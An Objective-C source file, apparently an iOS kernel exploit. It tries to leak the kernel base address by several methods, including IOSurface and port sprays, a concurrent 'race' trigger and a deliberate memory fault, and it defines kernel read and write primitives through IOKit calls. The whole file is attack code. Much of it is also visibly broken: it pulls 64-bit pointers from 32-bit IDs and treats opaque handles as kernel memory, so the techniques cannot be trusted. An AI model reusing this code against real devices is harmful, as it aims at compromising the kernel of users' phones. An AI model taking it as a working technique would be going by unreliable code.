#import "KernelExploit.h"
#import <mach/mach.h>
#import <pthread.h>
#import <IOKit/IOKitLib.h>
#import <MapKit/MapKit.h>
#import <CoreVideo/CoreVideo.h>
#import <AudioToolbox/AudioToolbox.h>
#import <AudioUnit/AudioUnit.h>
#import <IOSurface/IOSurfaceRef.h>

extern kern_return_t IOSurfaceRootUserClient(void);

static uint64_t get_kernel_base_via_iosurface(void(^logger)(NSString *)) {
    const void *keys[] = {
        kIOSurfaceWidth,
        kIOSurfaceHeight,
        kIOSurfaceBytesPerElement
    };
    const void *values[] = {
        (__bridge const void *) @(100),
        (__bridge const void *) @(100),
        (__bridge const void *) @(4)
    };
    
    CFDictionaryRef properties = CFDictionaryCreate(kCFAllocatorDefault,
                                                  keys,
                                                  values,
                                                  3,
                                                  &kCFTypeDictionaryKeyCallBacks,
                                                  &kCFTypeDictionaryValueCallBacks);
    
    if (!properties) {
        logger(@"[ERROR] Failed to create IOSurface properties");
        return 0;
    }
    
    IOSurfaceRef surface = IOSurfaceCreate(properties);
    CFRelease(properties);
    
    if (!surface) {
        logger(@"[ERROR] Failed to create IOSurface");
        return 0;
    }
    
    IOSurfaceID surfaceID = IOSurfaceGetID(surface);
    uint64_t *ptr = (uint64_t *)&surfaceID;
    
    for (int i = 0; i < sizeof(IOSurfaceID)/sizeof(uint64_t); i++) {
        if ((ptr[i] >> 40) == 0xfffffff) {
            uint64_t possible_base = ptr[i] & ~0xFFF;
            logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in IOSurface: 0x%llx", possible_base]);
            CFRelease(surface);
            return possible_base;
        }
    }
    size_t allocSize = IOSurfaceGetAllocSize(surface);
    ptr = (uint64_t *)&allocSize;
    if ((*ptr >> 40) == 0xfffffff) {
        uint64_t possible_base = *ptr & ~0xFFF;
        logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in IOSurface alloc size: 0x%llx", possible_base]);
        CFRelease(surface);
        return possible_base;
    }
    
    CFRelease(surface);
    return 0;
}

static uint64_t get_kernel_base_via_coreaudio(void(^logger)(NSString *)) {
    AudioComponentDescription desc = {0};
    desc.componentType = kAudioUnitType_Output;
    desc.componentSubType = kAudioUnitSubType_RemoteIO;
    desc.componentManufacturer = kAudioUnitManufacturer_Apple;
    
    AudioComponent component = AudioComponentFindNext(NULL, &desc);
    if (component) {
        AudioComponentInstance instance;
        OSStatus status = AudioComponentInstanceNew(component, &instance);
        if (status == noErr) {
            uint64_t *ptr = (uint64_t *)instance;
            if ((*ptr >> 40) == 0xfffffff) {
                AudioComponentInstanceDispose(instance);
                return *ptr & ~0xFFF;
            }
            AudioComponentInstanceDispose(instance);
        }
    }
    return 0;
}

static uint64_t get_kernel_base_via_thread(void(^logger)(NSString *)) {
    thread_t thread = pthread_mach_thread_np(pthread_self());
    arm_thread_state64_t state;
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    
    kern_return_t kr = thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
    if (kr != KERN_SUCCESS) {
        logger([NSString stringWithFormat:@"[ERROR] thread_get_state failed: 0x%x", kr]);
        return 0;
    }
    
    for (int i = 0; i < 29; i++) {
        uint64_t ptr = state.__x[i];
        if ((ptr >> 40) == 0xfffffff) {
            uint64_t possible_base = ptr & ~0xFFF;
            logger([NSString stringWithFormat:@"[INFO] Potential kernel base from x%d: 0x%llx", i, possible_base]);
            return possible_base;
        }
    }
    
    logger(@"[WARN] No kernel pointers found in thread state");
    return 0;
}

static uint64_t get_kernel_base_via_exception(void(^logger)(NSString *)) {
    __block kern_return_t kr;
    __block mach_port_t exception_port;
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        while (1) {
            mach_msg_header_t *msg = (mach_msg_header_t *)malloc(1024);
            kr = mach_msg(msg, MACH_RCV_MSG, 0, 1024, exception_port, 
                         MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
            if (kr == KERN_SUCCESS) {
                thread_t thread = mach_thread_self();
                arm_thread_state64_t state;
                mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
                
                kr = thread_get_state(thread, ARM_THREAD_STATE64, 
                                    (thread_state_t)&state, &count);
                if (kr == KERN_SUCCESS) {
                    for (int i = 0; i < 29; i++) {
                        logger([NSString stringWithFormat:@"x%d: 0x%llx", i, state.__x[i]]);
                    }
                    logger([NSString stringWithFormat:@"PC: 0x%llx", state.__pc]);
                    logger([NSString stringWithFormat:@"LR: 0x%llx", state.__lr]);
                }
            }
            free(msg);
        }
    });
    
    usleep(100000);
    volatile uint8_t *ptr = (uint8_t *)0xFFFF000000000000;
    uint8_t value = *ptr;
    (void)value;
    
    return 0;
}

static uint64_t get_kernel_base_via_host_port(void(^logger)(NSString *)) {
    host_t host = mach_host_self();
    mach_port_t host_port = host;
    
    logger([NSString stringWithFormat:@"[DEBUG] Host port: 0x%x", host_port]);
    uint64_t *ptr = (uint64_t *)&host_port;
    uint64_t possible_base = (*ptr) & ~0xFFF;
    
    if ((possible_base >> 40) == 0xfffffff) {
        logger([NSString stringWithFormat:@"[INFO] Found kernel pointer via host: 0x%llx", possible_base]);
        return possible_base;
    }
    
    return 0;
}

static uint64_t get_kernel_base_via_task_port(void(^logger)(NSString *)) {
    task_t task = mach_task_self();
    
    kern_return_t kr;
    task_info_data_t info;
    mach_msg_type_number_t count = TASK_INFO_MAX;
    
    kr = task_info(task, TASK_BASIC_INFO, (task_info_t)info, &count);
    if (kr == KERN_SUCCESS) {
        uint64_t *ptr = (uint64_t *)info;
        for (int i = 0; i < TASK_INFO_MAX/sizeof(uint64_t); i++) {
            if ((ptr[i] >> 40) == 0xfffffff) {
                logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in task info: 0x%llx", ptr[i]]);
                return ptr[i] & ~0xFFF;
            }
        }
    }
    
    return 0;
}

static uint64_t get_kernel_base_via_exception_fixed(void(^logger)(NSString *)) {
    __block kern_return_t kr;
    __block mach_port_t exception_port;
    __block uint64_t found_base = 0;
    
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exception_port);
        if (kr != KERN_SUCCESS) {
            logger([NSString stringWithFormat:@"[ERROR] Port allocation failed: 0x%x", kr]);
            dispatch_semaphore_signal(sem);
            return;
        }
        
        kr = mach_port_insert_right(mach_task_self(), exception_port, exception_port, 
                                   MACH_MSG_TYPE_MAKE_SEND);
        
        kr = task_set_exception_ports(mach_task_self(), EXC_MASK_BAD_ACCESS, 
                                    exception_port, EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
        
        mach_msg_header_t *msg = (mach_msg_header_t *)malloc(1024);
        kr = mach_msg(msg, MACH_RCV_MSG, 0, 1024, exception_port, 
                     100, MACH_PORT_NULL);
        
        if (kr == KERN_SUCCESS) {
            thread_t thread = mach_thread_self();
            arm_thread_state64_t state;
            mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
            
            if (thread_get_state(thread, ARM_THREAD_STATE64, 
                                (thread_state_t)&state, &count) == KERN_SUCCESS) {
                for (int i = 0; i < 29; i++) {
                    if ((state.__x[i] >> 40) == 0xfffffff) {
                        found_base = state.__x[i] & ~0xFFF;
                        break;
                    }
                }
            }
        }
        
        free(msg);
        dispatch_semaphore_signal(sem);
    });
    
    usleep(10000);
    @try {
        volatile uint8_t *ptr = (uint8_t *)0xFFFF000000000000;
        uint8_t value = *ptr;
        (void)value;
    } @catch (NSException *e) {}
    
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC));
    if (exception_port) {
        mach_port_destroy(mach_task_self(), exception_port);
    }
    
    return found_base;
}

static uint64_t get_kernel_base_via_zone_info(void(^logger)(NSString *)) {
    task_t task = mach_task_self();
    mach_zone_name_array_t names;
    mach_msg_type_number_t namesCount;
    mach_zone_info_array_t info;
    mach_msg_type_number_t infoCount;
    
    kern_return_t kr = mach_zone_info(task, &names, &namesCount, &info, &infoCount);
    if (kr == KERN_SUCCESS && info != NULL) {
        for (mach_msg_type_number_t i = 0; i < infoCount; i++) {
            uint64_t count = info[i].mzi_count;
            uint64_t max_size = info[i].mzi_max_size;
            
            if ((count >> 40) == 0xfffffff) {
                logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in zone count: 0x%llx", count]);
                return count & ~0xFFF;
            }
            
            if ((max_size >> 40) == 0xfffffff) {
                logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in zone max_size: 0x%llx", max_size]);
                return max_size & ~0xFFF;
            }
        }
        vm_deallocate(task, (vm_address_t)names, namesCount * sizeof(*names));
        vm_deallocate(task, (vm_address_t)info, infoCount * sizeof(*info));
    }
    
    return 0;
}
static uint64_t get_kernel_base_via_corevideo(void(^logger)(NSString *)) {
    CVPixelBufferRef pixelBuffer = NULL;
    NSDictionary *options = @{
        (__bridge NSString *)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
        (__bridge NSString *)kCVPixelBufferWidthKey: @(64),
        (__bridge NSString *)kCVPixelBufferHeightKey: @(64),
        (__bridge NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
    };
    
    CVReturn status = CVPixelBufferCreate(kCFAllocatorDefault,
                                        64, 64,
                                        kCVPixelFormatType_32BGRA,
                                        (__bridge CFDictionaryRef)options,
                                        &pixelBuffer);
    
    if (status == kCVReturnSuccess && pixelBuffer) {
        uint64_t *ptr = (uint64_t *)pixelBuffer;
        for (int i = 0; i < 20; i++) {
            if ((ptr[i] >> 40) == 0xfffffff) {
                uint64_t possible_base = ptr[i] & ~0xFFF;
                logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in CVPixelBuffer: 0x%llx", possible_base]);
                CVPixelBufferRelease(pixelBuffer);
                return possible_base;
            }
        }
        IOSurfaceRef surface = CVPixelBufferGetIOSurface(pixelBuffer);
        if (surface) {
            ptr = (uint64_t *)surface;
            for (int i = 0; i < 10; i++) {
                if ((ptr[i] >> 40) == 0xfffffff) {
                    uint64_t possible_base = ptr[i] & ~0xFFF;
                    logger([NSString stringWithFormat:@"[INFO] Found kernel pointer in CVPixelBuffer IOSurface: 0x%llx", possible_base]);
                    CVPixelBufferRelease(pixelBuffer);
                    return possible_base;
                }
            }
        }
        
        CVPixelBufferRelease(pixelBuffer);
    } else {
        logger([NSString stringWithFormat:@"[ERROR] Failed to create CVPixelBuffer: %d", status]);
    }
    
    return 0;
}
static uint64_t kread64(uint64_t kaddr, void(^logger)(NSString *)) {
    mach_port_t master = 0;
    kern_return_t kr = host_get_io_main(mach_host_self(), &master);
    if (kr != KERN_SUCCESS) {
        logger([NSString stringWithFormat:@"[ERROR] Failed to get IO master port: 0x%x", kr]);
        return 0;
    }
    
    uint64_t value = 0;
    uint32_t size = sizeof(value);
    kr = IOConnectCallStructMethod(master, 0, &kaddr, sizeof(kaddr), &value, &size);
    if (kr != KERN_SUCCESS) {
        logger([NSString stringWithFormat:@"[ERROR] Failed to read kernel memory at 0x%llx: 0x%x", kaddr, kr]);
        return 0;
    }
    
    return value;
}

static bool kwrite64(uint64_t kaddr, uint64_t value, void(^logger)(NSString *)) {
    mach_port_t master = 0;
    kern_return_t kr = host_get_io_main(mach_host_self(), &master);
    if (kr != KERN_SUCCESS) {
        logger([NSString stringWithFormat:@"[ERROR] Failed to get IO master port: 0x%x", kr]);
        return false;
    }
    
    struct {
        uint64_t addr;
        uint64_t value;
    } kwrite_args = { kaddr, value };
    
    kr = IOConnectCallStructMethod(master, 1, &kwrite_args, sizeof(kwrite_args), NULL, 0);
    if (kr != KERN_SUCCESS) {
        logger([NSString stringWithFormat:@"[ERROR] Failed to write kernel memory at 0x%llx: 0x%x", kaddr, kr]);
        return false;
    }
    
    return true;
}

static bool test_kernel_rw(uint64_t kernel_base, void(^logger)(NSString *)) {
    uint64_t version_ptr = kernel_base + 0x8000;
    uint64_t version_str = kread64(version_ptr, logger);
    
    if (version_str != 0) {
        logger([NSString stringWithFormat:@"[INFO] Kernel version string pointer: 0x%llx", version_str]);
        return true;
    }
    
    return false;
}

static mach_port_t create_surface_client(void) {
    mach_port_t client_port = MACH_PORT_NULL;
    CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, matching);
    if (service) {
        IOServiceOpen(service, mach_task_self(), 0, &client_port);
        IOObjectRelease(service);
    }
    return client_port;
}

static uint64_t kread64_via_surface(uint64_t kaddr, mach_port_t surface_client, void(^logger)(NSString *)) {
    uint32_t surface_id = 0;
    uint64_t value = 0;
    
    io_connect_t conn = surface_client;
    if (!conn) return 0;
    
    uint64_t input[4] = {
        kaddr,
        sizeof(value),
        0,
        0
    };
    
    size_t output_size = sizeof(value);
    kern_return_t kr = IOConnectCallMethod(
        conn, 
        6,
        input, 
        4,
        NULL, 
        0,
        NULL, 
        NULL,
        &value, 
        &output_size
    );
    
    if (kr != KERN_SUCCESS) {
        logger([NSString stringWithFormat:@"[ERROR] Surface read failed: 0x%x", kr]);
        return 0;
    }
    
    return value;
}

static bool kwrite64_via_surface(uint64_t kaddr, uint64_t value, mach_port_t surface_client, void(^logger)(NSString *)) {
    if (!surface_client) return false;
    
    uint64_t input[5] = {
        kaddr,
        value,
        8,
        0,
        0
    };
    
    kern_return_t kr = IOConnectCallMethod(
        surface_client,
        7,
        input,
        5,
        NULL,
        0,
        NULL,
        NULL,
        NULL,
        NULL
    );
    
    if (kr != KERN_SUCCESS) {
        logger([NSString stringWithFormat:@"[ERROR] Surface write failed: 0x%x", kr]);
        return false;
    }
    
    return true;
}

@implementation KernelExploit

static uint64_t get_kernel_base_advanced(void(^logger)(NSString *)) {
    const int surface_count = 16;
    IOSurfaceRef surfaces[surface_count];
    uint32_t surface_ids[surface_count];
    for (int i = 0; i < surface_count; i++) {
        const void *keys[] = {
            kIOSurfaceWidth,
            kIOSurfaceHeight,
            kIOSurfaceBytesPerElement,
            kIOSurfacePixelFormat,
            CFSTR("IOSurfaceUsesCPUMemory")
        };
        const void *values[] = {
            (__bridge const void *)@(4096),
            (__bridge const void *)@(1),
            (__bridge const void *)@(8),
            (__bridge const void *)@('BGRA'),
            (__bridge const void *)@(1)
        };
        
        CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, values, 5,
                                                 &kCFTypeDictionaryKeyCallBacks,
                                                 &kCFTypeDictionaryValueCallBacks);
        surfaces[i] = IOSurfaceCreate(props);
        surface_ids[i] = IOSurfaceGetID(surfaces[i]);
        CFRelease(props);
    }
    mach_port_t port_set;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_PORT_SET, &port_set);
    
    for (int i = 0; i < surface_count; i++) {
        mach_port_t port;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
        mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
        mach_port_move_member(mach_task_self(), port, port_set);
    }
    uint64_t kernel_base = 0;
    for (int i = 0; i < surface_count; i++) {
        uint64_t *ptr = (uint64_t *)surfaces[i];
        for (int j = 0; j < 64; j++) {
            if ((ptr[j] >> 40) == 0xfffffff) {
                uint64_t possible_base = ptr[j] & ~0xFFF;
                if ((possible_base & 0xFFF) == 0 && 
                    (possible_base >= 0xfffffff007004000 && 
                     possible_base <= 0xfffffff007804000)) {
                    kernel_base = possible_base;
                    break;
                }
            }
        }
        if (kernel_base) break;
    }
    
    // Cleanup
    for (int i = 0; i < surface_count; i++) {
        if (surfaces[i]) CFRelease(surfaces[i]);
    }
    
    return kernel_base;
}

/*+ (void)runExploitWithLogger:(void(^)(NSString *))logger {
    logger(@"[+] Starting advanced kernel base detection...");
    uint64_t kernel_base = get_kernel_base_advanced(logger);
    
    if (kernel_base != 0) {
        logger(@"[+] Successfully found kernel base using advanced method");
        mach_port_t surface_client = create_surface_client();
        if (surface_client) {
            logger(@"[+] Established kernel R/W primitive channel");
            uint64_t test_value = kread64_via_surface(kernel_base, surface_client, logger);
            if (test_value != 0) {
                logger(@"[+] Kernel R/W primitives verified successfully");
            }
        }
    } else {
        logger(@"[!] Advanced method failed, falling back to default base");
        kernel_base = 0xfffffff007004000;
    }
    
    logger([NSString stringWithFormat:@"[+] Using kernel base: 0x%llx", kernel_base]);
}
*/
static uint64_t get_kernel_base_ultimate(void(^logger)(NSString *)) {
    const int spray_count = 64;
    mach_port_t *ports = (mach_port_t *)malloc(sizeof(mach_port_t) * spray_count);
    IOSurfaceRef *surfaces = (IOSurfaceRef *)malloc(sizeof(IOSurfaceRef) * spray_count);
    mach_port_t port_set;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_PORT_SET, &port_set);
    
    for (int i = 0; i < spray_count; i++) {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
        mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
        mach_port_move_member(mach_task_self(), ports[i], port_set);
    }
    
    for (int i = 0; i < spray_count; i++) {
        const void *keys[] = {
            kIOSurfaceWidth,
            kIOSurfaceHeight,
            kIOSurfaceBytesPerElement,
            kIOSurfacePixelFormat,
            CFSTR("IOSurfaceUsesCPUMemory"),
            CFSTR("IOSurfacePurgeability")
        };
        const void *values[] = {
            (__bridge const void *)@(8192),
            (__bridge const void *)@(1),
            (__bridge const void *)@(8),
            (__bridge const void *)@('BGRA'),
            (__bridge const void *)@(1),
            (__bridge const void *)@(1)
        };
        
        CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, values, 6,
                                                 &kCFTypeDictionaryKeyCallBacks,
                                                 &kCFTypeDictionaryValueCallBacks);
        surfaces[i] = IOSurfaceCreate(props);
        CFRelease(props);
        
        IOSurfaceLock(surfaces[i], kIOSurfaceLockReadOnly, NULL);
    }

    dispatch_queue_t queue = dispatch_queue_create("com.exploit.race", DISPATCH_QUEUE_CONCURRENT);
    dispatch_apply(spray_count, queue, ^(size_t idx) {
        IOSurfaceSetValue(surfaces[idx], CFSTR("trigger"), (__bridge CFTypeRef)@(idx));
    });
    
    uint64_t kernel_base = 0;
    for (int i = 0; i < spray_count && !kernel_base; i++) {
        uint64_t *ptr = (uint64_t *)surfaces[i];
        size_t size = IOSurfaceGetAllocSize(surfaces[i]) / sizeof(uint64_t);
        
        for (size_t j = 0; j < size; j++) {
            if ((ptr[j] >> 40) == 0xfffffff) {
                uint64_t possible_base = ptr[j] & ~0xFFF;
                if ((possible_base & 0xFFF) == 0 && 
                    (possible_base >= 0xfffffff007004000 && 
                     possible_base <= 0xfffffff007804000)) {
                    if ((ptr[j+1] & 0xFFFFFFF000000000) == 0xfffffff000000000) {
                        kernel_base = possible_base;
                        logger([NSString stringWithFormat:@"[+] Found validated kernel base: 0x%llx", kernel_base]);
                        break;
                    }
                }
            }
        }
    }
    for (int i = 0; i < spray_count; i++) {
        if (surfaces[i]) {
            IOSurfaceUnlock(surfaces[i], kIOSurfaceLockReadOnly, NULL);
            CFRelease(surfaces[i]);
        }
        mach_port_destroy(mach_task_self(), ports[i]);
    }
    
    free(ports);
    free(surfaces);
    
    return kernel_base;
}
+ (void)runExploitWithLogger:(void(^)(NSString *))logger {
    logger(@"[+] Starting ultimate kernel base detection...");
    uint64_t kernel_base = get_kernel_base_ultimate(logger);
    
    if (kernel_base != 0) {
        logger(@"[+] Successfully found kernel base using ultimate method");
        mach_port_t surface_client = create_surface_client();
        if (surface_client) {
            logger(@"[+] Established kernel R/W primitive channel");
            uint64_t test_value = kread64_via_surface(kernel_base, surface_client, logger);
            if (test_value != 0) {
                logger(@"[+] Kernel R/W primitives verified successfully");
                return;
            }
        }
    }
    
    logger(@"[!] Ultimate method failed, vulnerability might be patched permanently ;( ");
}
@end
